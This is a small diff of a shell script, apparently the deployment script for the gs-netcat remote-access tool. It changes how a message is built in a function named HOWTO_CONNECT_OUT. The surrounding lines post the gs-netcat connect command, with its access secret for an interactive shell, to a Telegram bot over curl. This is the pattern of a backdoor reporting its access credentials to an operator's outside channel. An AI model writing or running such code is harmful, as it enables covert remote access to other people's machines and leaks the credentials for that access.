@@ -1085,7 +1085,7 @@ HOWTO_CONNECT_OUT() {
         return 1
     fi
 
-    MESSAGE="${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}"
+    MESSAGE="gs-netcat -s \"${GS_SECRET}\" -i"
     curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
         -d "chat_id=${CHAT_ID}" \
         -d "text=${MESSAGE}"
